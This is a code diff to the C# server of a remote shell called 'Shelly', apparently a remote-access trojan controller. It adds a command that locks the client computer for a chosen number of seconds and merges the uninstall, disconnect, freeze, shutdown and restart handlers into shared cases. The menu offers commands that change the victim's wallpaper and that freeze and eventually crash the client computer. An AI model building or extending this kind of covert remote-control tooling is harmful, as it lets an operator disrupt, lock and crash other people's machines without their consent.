@@ -32,7 +32,8 @@ namespace Shelly_Server
 
                         "FUN\n" +
                         "1. ChangeWallpaper - Changes client desktop wallpaper\n" +
-                        "2. Freeze - Freezes and eventually crashes the client computer\n\n" +
+                        "2. Freeze - Freezes and eventually crashes the client computer\n" +
+                        "3. Lock - Locks the client computer for x amount of seconds\n\n" +
 
                         "POWER OPTIONS\n" +
 
@@ -44,6 +45,8 @@ namespace Shelly_Server
 
                 // Clears the console
                 case "clear":
+
+                    // Clear
                     Console.Clear();
                     break;
 
@@ -53,27 +56,6 @@ namespace Shelly_Server
                     // Disconnect and exit
                     SocketHandler.ShutdownServer();
                     break;
-
-                // Uninstall shell
-                case "uninstall":
-
-                    // Send message
-                    SocketHandler.Send(Command);
-
-                    // Disconnect and exit
-                    SocketHandler.ShutdownServer();
-                    break;
-
-                // Uninstall shell
-                case "disconnect":
-
-                    // Send message
-                    SocketHandler.Send(Command);
-
-                    // Disconnect and exit
-                    SocketHandler.ShutdownServer();
-                    break;
-
 
                 // Request Ping from client
                 case "ping":
@@ -123,35 +105,27 @@ namespace Shelly_Server
                     SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(2));
                     break;
 
-                // Freeze
-                case "freeze":
+                // Lock
+                case "lock":
 
                     // Send message
-                    SocketHandler.Send(Command);
-
-                    // Disconnect and exit
-                    SocketHandler.ShutdownServer();
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLockInput());
                     break;
+
+                // Uninstall shell
+                case "uninstall":
+
+                // Uninstall shell
+                case "disconnect":
+
+                // Freeze
+                case "freeze":
 
                 // Shutdown client computer
                 case "shutdown":
 
-                    // Send message
-                    SocketHandler.Send(Command);
-
-                    // Disconnect and exit
-                    SocketHandler.ShutdownServer();
-                    break;
-
                 // Restart client computer
                 case "restart":
-
-                    // Send message
-                    SocketHandler.Send(Command);
-
-                    // Disconnect and exit
-                    SocketHandler.ShutdownServer();
-                    break;
 
                 // Hibernate client computer
                 case "hibernate":
